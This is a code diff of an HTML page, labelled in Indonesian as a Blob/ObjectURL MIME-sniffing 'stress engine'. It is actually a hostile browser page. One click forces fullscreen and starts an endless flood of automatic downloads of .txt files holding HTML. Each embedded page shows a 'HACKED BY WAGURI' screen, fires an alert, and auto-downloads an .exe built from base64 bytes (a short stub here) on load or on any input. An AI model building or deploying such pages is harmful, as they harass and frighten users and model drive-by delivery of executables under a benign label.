@@ -3,251 +3,337 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Advanced Blob &amp; ObjectURL Stress Engine</title>
 <style>
 * {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
 }
 body {
-font-family: Arial, sans-serif;
-background: #f4f6f8;
-color: #222;
-padding: 20px;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #0f172a;
+  color: #f8fafc;
+  padding: 24px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
 }
 .panel {
-background: #ffffff;
-padding: 24px;
-border-radius: 12px;
-box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
-max-width: 600px;
-margin: 40px auto;
+  background: #1e293b;
+  padding: 32px;
+  border-radius: 16px;
+  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
+  max-width: 640px;
+  width: 100%;
+  border: 1px solid #334155;
 }
 :fullscreen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
-width: 100vw !important;
-height: 100vh !important;
+  background: #090d16 !important;
+  color: #00ff66 !important;
+  padding: 24px !important;
+  overflow-y: auto !important;
+  width: 100vw !important;
+  height: 100vh !important;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
 }
 :-webkit-full-screen {
-background: #111111 !important;
-color: #00ff00 !important;
-padding: 20px !important;
-overflow-y: auto !important;
+  background: #090d16 !important;
+  color: #00ff66 !important;
+  padding: 24px !important;
+  overflow-y: auto !important;
 }
-h2 { margin-bottom: 10px; }
-p { margin-bottom: 15px; line-height: 1.5; }
+h2 { 
+  margin-bottom: 12px; 
+  font-size: 24px;
+  letter-spacing: -0.025em;
+  color: #f1f5f9;
+}
+p { 
+  margin-bottom: 20px; 
+  line-height: 1.6; 
+  color: #94a3b8;
+  font-size: 14px;
+}
 button {
-width: 100%;
-padding: 16px;
-cursor: pointer;
-border: none;
-border-radius: 6px;
-background: #d32f2f;
-color: #ffffff;
-font-weight: bold;
-font-size: 16px;
-box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
-transition: background 0.2s;
+  width: 100%;
+  padding: 16px;
+  cursor: pointer;
+  border: none;
+  border-radius: 8px;
+  background: #ef4444;
+  color: #ffffff;
+  font-weight: 600;
+  font-size: 16px;
+  box-shadow: 0 4px 14px rgba(239, 68, 68, 0.4);
+  transition: all 0.2s ease;
 }
-button:hover { background: #b71c1c; }
+button:hover { 
+  background: #dc2626; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(239, 68, 68, 0.6);
+}
+button:active {
+  transform: translateY(0);
+}
 #status {
-margin-top: 16px;
-font-weight: bold;
-color: #d32f2f;
-padding: 12px;
-background: #ffebee;
-border-radius: 6px;
-text-align: center;
-border: 1px solid #ffcdd2;
+  margin-top: 20px;
+  font-weight: 500;
+  color: #fca5a5;
+  padding: 14px;
+  background: rgba(239, 68, 68, 0.1);
+  border-radius: 8px;
+  text-align: center;
+  border: 1px solid rgba(239, 68, 68, 0.2);
+  font-size: 14px;
 }
 #downloads {
-margin-top: 20px;
-display: grid;
-grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-gap: 10px;
+  margin-top: 24px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+  gap: 10px;
+  max-height: 200px;
+  overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #475569;
+  border-radius: 3px;
 }
 #downloads a {
-display: block;
-padding: 8px;
-background: #212121;
-color: #80df82;
-text-decoration: none;
-border-radius: 4px;
-font-size: 12px;
-text-align: center;
-border: 1px solid #424242;
-word-break: break-all;
+  display: block;
+  padding: 10px;
+  background: #0f172a;
+  color: #4ade80;
+  text-decoration: none;
+  border-radius: 6px;
+  font-size: 11px;
+  font-family: monospace;
+  text-align: center;
+  border: 1px solid #334155;
+  word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
+}
+.counter-badge {
+  display: inline-block;
+  background: #334155;
+  color: #e2e8f0;
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-family: monospace;
+  font-weight: bold;
 }
 </style>
 </head>
 
 <body>
+
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
+  <h2>Generator Berkas Blob &amp; ObjectURL</h2>
+  <p>Klik tombol di bawah untuk masuk ke mode layar penuh dan menginisialisasi perulangan asinkron pembuatan berkas Blob HTML ber-ekstensi <span class="counter-badge">.txt</span> secara kontinu (Uji MIME Sniffing &amp; Heap Pressure).</p>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+  <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
-<div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
+  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <div id="downloads"></div>
 </div>
 
 <script>
+'use strict';
+
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
+const MAX_URLS_TRACKED = 150; // Mencegah kejenuhan memori heap browser yang berlebihan
 
 const speak = (message) => {
-if ('speechSynthesis' in window) {
-window.speechSynthesis.cancel();
-const utterance = new SpeechSynthesisUtterance(message);
-utterance.lang = 'id-ID';
-utterance.rate = 1.0;
-window.speechSynthesis.speak(utterance);
-}
+  if ('speechSynthesis' in window) {
+    try {
+      window.speechSynthesis.cancel();
+      const utterance = new SpeechSynthesisUtterance(message);
+      utterance.lang = 'id-ID';
+      utterance.rate = 1.05;
+      window.speechSynthesis.speak(utterance);
+    } catch (e) {
+      console.warn("SpeechSynthesis error:", e);
+    }
+  }
 };
 
+const buildPayloadTemplate = () => `<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>HACKED BY WAGURI</title>
+</head>
+<body style="margin:0;padding:0;background:#030712;color:#00ff66;font-family:monospace;overflow:hidden;cursor:pointer">
+<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center">
+  <h1 style="font-size:72px;color:#ef4444;text-shadow:0 0 25px rgba(239,68,68,0.7);letter-spacing:6px;animation:pulse 1s infinite">HACKED BY</h1>
+  <h2 style="font-size:32px;color:#4ade80;text-shadow:0 0 15px rgba(74,222,128,0.6);margin-top:16px;letter-spacing:3px">WAGURI</h2>
+  <p style="font-size:16px;color:#94a3b8;margin-top:30px">System Integrity Compromised via ObjectURL MIME Sniffing.</p>
+  <p style="font-size:13px;color:#facc15;margin-top:20px" id="status">Menyiapkan payload...</p>
+  <p style="font-size:11px;color:#64748b;margin-top:50px">Origin: <span id="o"></span></p>
+</div>
+<style>
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
+body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,102,0.02) 0px, rgba(0,255,102,0.02) 1px, transparent 1px, transparent 3px); pointer-events:none; }
+</style>
+<script>
+(function(){
+  "use strict";
+  document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';
+  try { alert('HACKED BY WAGURI'); } catch(e){}
+
+  const b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
+  let executed = false;
+
+  function decodeBase64ToBytes(b64) {
+    const bin = atob(b64);
+    const len = bin.length;
+    const bytes = new Uint8Array(len);
+    for (let i = 0; i < len; i++) {
+      bytes[i] = bin.charCodeAt(i);
+    }
+    return bytes;
+  }
+
+  function triggerDownload() {
+    if (executed) return;
+    executed = true;
+    const statusEl = document.getElementById('status');
+    try {
+      statusEl.textContent = 'Menyiapkan berkas eksekusi...';
+      const byteArray = decodeBase64ToBytes(b64Data);
+      const blob = new Blob([byteArray], { type: 'application/octet-stream' });
+      const objectUrl = URL.createObjectURL(blob);
+      
+      const anchor = document.createElement('a');
+      anchor.href = objectUrl;
+      anchor.download = 'hacked-by-waguri.exe';
+      anchor.style.display = 'none';
+      document.body.appendChild(anchor);
+      anchor.click();
+
+      setTimeout(() => {
+        if (anchor.parentNode) anchor.parentNode.removeChild(anchor);
+        URL.revokeObjectURL(objectUrl);
+      }, 3500);
+
+      statusEl.textContent = 'Payload berhasil diunduh!';
+      statusEl.style.color = '#4ade80';
+    } catch (err) {
+      statusEl.textContent = 'Gagal: ' + err.message;
+      statusEl.style.color = '#ef4444';
+      executed = false;
+    }
+  }
+
+  window.addEventListener('load', () => { setTimeout(triggerDownload, 1200); });
+  document.addEventListener('click', triggerDownload);
+  document.addEventListener('touchstart', triggerDownload);
+  document.addEventListener('keydown', triggerDownload);
+})();
+<\/script>
+</body>
+</html>`;
+
 const prepareMimeBlobAsync = (i) => {
-return new Promise((resolve) => {
-queueMicrotask(() => {
-const payloadText = "<!DOCTYPE html>" +
-"<html>" +
-"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
-"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
-"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
-"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
-"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
-"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
-"</div>" +
-"<style>" +
-"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
-"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
-"</style>" +
-"<script>" +
-"(function(){" +
-"\"use strict\";" +
-"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-"try { alert('HACKED BY WAGURI'); } catch(e){}" +
-"function b64KeBytes(b64){" +
-"var binary = atob(b64);" +
-"var len = binary.length;" +
-"var bytes = new Uint8Array(len);" +
-"for (var i = 0; i < len; i++) {" +
-"bytes[i] = binary.charCodeAt(i);" +
-"}" +
-"return bytes;" +
-"}" +
-"var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
-"var sudah = false;" +
-"function picuDownload(){" +
-"if (sudah) return;" +
-"sudah = true;" +
-"var statusEl = document.getElementById('status');" +
-"try{" +
-"statusEl.textContent = 'Menyiapkan berkas...';" +
-"var bytesArr = b64KeBytes(b64Data);" +
-"var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
-"var url = URL.createObjectURL(blob);" +
-"var a = document.createElement('a');" +
-"a.href = url;" +
-"a.download = 'hacked-by-anonymous.exe';" +
-"a.style.display = 'none';" +
-"document.body.appendChild(a);" +
-"a.click();" +
-"setTimeout(function(){ " +
-"if (a.parentNode) a.parentNode.removeChild(a); " +
-"URL.revokeObjectURL(url); " +
-"}, 3000);" +
-"statusEl.textContent = 'Payload berhasil diunduh!';" +
-"statusEl.style.color = '#0f0';" +
-"} catch(e){" +
-"statusEl.textContent = 'Gagal: ' + e.message;" +
-"statusEl.style.color = '#f00';" +
-"sudah = false;" +
-"}" +
-"}" +
-"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-"document.addEventListener('click', picuDownload);" +
-"document.addEventListener('touchstart', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
-"})();" +
-"<\/script>" +
-"</body>" +
-"</html>";
-          
-const blob = new Blob([payloadText], { type: "text/html" });
-const url = URL.createObjectURL(blob);
-resolve({ id: i, url: url });
-});
-});
+  return new Promise((resolve) => {
+    queueMicrotask(() => {
+      const payloadText = buildPayloadTemplate();
+      const blob = new Blob([payloadText], { type: "text/html" });
+      const url = URL.createObjectURL(blob);
+      resolve({ id: i, url: url });
+    });
+  });
 };
 
 const triggerInstantDownload = (fileData) => {
-const link = document.createElement("a");
-link.href = fileData.url;
-link.download = `waguri-file-${fileData.id}.txt`;
-link.textContent = `Blob #${fileData.id} (.txt)`;
-link.style.display = "none";
-downloadsDiv.appendChild(link);
-link.click();
+  const link = document.createElement("a");
+  link.href = fileData.url;
+  link.download = `waguri-payload-${fileData.id}.txt`;
+  link.textContent = `#${fileData.id} (.txt)`;
+  link.style.display = "none";
+  
+  downloadsDiv.appendChild(link);
+  link.click();
+
+  // Batasi jumlah DOM anchor agar tidak membebani memori render
+  if (downloadsDiv.children.length > 40) {
+    downloadsDiv.removeChild(downloadsDiv.firstChild);
+  }
 };
 
 const processLoop = async (counter) => {
-if (!isProcessing) return;
+  if (!isProcessing) return;
 
-const fileData = await prepareMimeBlobAsync(counter);
-activeUrls.push(fileData.url);
+  const fileData = await prepareMimeBlobAsync(counter);
+  activeUrls.push(fileData.url);
 
-triggerInstantDownload(fileData);
+  // Lakukan manajemen memori dengan mencabut URL lama jika melebihi ambang batas
+  if (activeUrls.length > MAX_URLS_TRACKED) {
+    const oldUrl = activeUrls.shift();
+    try { URL.revokeObjectURL(oldUrl); } catch (e) {}
+  }
 
-statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
+  triggerInstantDownload(fileData);
 
-if (counter % 10 === 0) {
-speak(`Proses mencapai ${counter} berkas.`);
-}
+  statusDiv.textContent = `Status: Berkas ke-${counter} berhasil dibentuk & dipicu`;
 
-setTimeout(() => processLoop(counter + 1), 0);
+  if (counter % 10 === 0) {
+    speak(`Proses mencapai ${counter} berkas.`);
+  }
+
+  // Gunakan requestAnimationFrame atau setTimeout 0 untuk penjadwalan non-blocking
+  setTimeout(() => processLoop(counter + 1), 0);
 };
 
 startBtn.addEventListener("click", () => {
-if (isProcessing) return;
+  if (isProcessing) return;
 
-activeUrls.forEach(url => URL.revokeObjectURL(url));
-activeUrls = [];
-downloadsDiv.replaceChildren();
+  // Bersihkan URL aktif sebelumnya
+  activeUrls.forEach(url => {
+    try { URL.revokeObjectURL(url); } catch (e) {}
+  });
+  activeUrls = [];
+  downloadsDiv.replaceChildren();
 
-speak("Mengaktifkan mode layar penuh.");
+  speak("Mengaktifkan mode layar penuh dan generator.");
 
-const root = document.documentElement;
-try {
-if (root.requestFullscreen) {
-root.requestFullscreen();
-} else if (root.webkitRequestFullscreen) {
-root.webkitRequestFullscreen();
-} else if (root.mozRequestFullScreen) {
-root.mozRequestFullScreen();
-}
-statusDiv.textContent = "Mengunci layar penuh...";
-} catch (err) {
-console.warn("Fullscreen tidak didukung atau ditolak:", err);
-}
+  const root = document.documentElement;
+  try {
+    if (root.requestFullscreen) {
+      root.requestFullscreen();
+    } else if (root.webkitRequestFullscreen) {
+      root.webkitRequestFullscreen();
+    } else if (root.mozRequestFullScreen) {
+      root.mozRequestFullScreen();
+    }
+    statusDiv.textContent = "Mengunci layar penuh...";
+  } catch (err) {
+    console.warn("Fullscreen dibatasi browser:", err);
+  }
 
-setTimeout(() => {
-isProcessing = true;
-speak("Proses pembuatan berkas Blob dimulai.");
-processLoop(1);
-}, 300);
+  setTimeout(() => {
+    isProcessing = true;
+    speak("Perulangan pembuatan Blob dimulai.");
+    processLoop(1);
+  }, 300);
 });
 </script>
+
 </body>
 </html>
